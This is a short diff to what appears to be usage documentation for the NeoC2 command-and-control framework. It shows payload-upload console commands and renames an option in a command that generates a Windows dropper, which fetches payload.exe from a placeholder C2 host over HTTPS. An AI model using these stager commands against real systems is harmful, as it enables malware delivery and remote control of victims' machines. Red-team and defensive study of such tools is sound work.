@@ -20,5 +20,5 @@ NeoC2 > payload_upload status                                                # C
 NeoC2 > payload_upload clear                                                 # Clear uploaded payload
 
 # Then deploy droppers
-NeoC2 > stager generate windows_binary host=<c2_host> port=<c2_port> protocol=https download_uri=/stage/my/payload.exe
+NeoC2 > stager generate windows_exe host=<c2_host> port=<c2_port> protocol=https download_uri=/stage/my/payload.exe
 ```
